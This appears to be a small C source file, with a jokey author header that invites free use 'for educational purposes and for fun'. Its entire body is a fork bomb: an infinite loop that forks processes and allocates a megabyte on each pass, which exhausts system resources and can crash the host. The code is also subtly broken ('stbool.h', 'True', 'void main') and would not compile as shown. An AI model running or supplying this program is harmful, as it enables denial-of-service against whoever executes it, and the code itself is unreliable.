/*
Author: Katevas Chris

github: https://github.com/katevaschris
	
Planet: Earth 
Date: 	
	
Version 1.0
Function:

Copyright (C)
Protected by GNU GPLv3
	
	~ 
	Greetings Mate!
	¯\_(ツ)_/¯ 
	
	I don't mind what you use this code for! it wasn't made for professional use.
	Instead, it was made for educational purposes and for fun.
	Please hack this, change it and use it in any way you see fit.
	Please, be acknowledged that I take no responsibility for anything bad that 
	happens, to you as a result of your actions. However this code is protected by GNU GPLv3,
	this means you must attribute me if you use it. Have fun and...
	Cheers :D
	~

*/
#include <unistd.h>
#include <stdlib.h>
#include <stbool.h>
void main() 
{
	while(True) 
	{
		fork();
		malloc(1024*1024);
	}
}
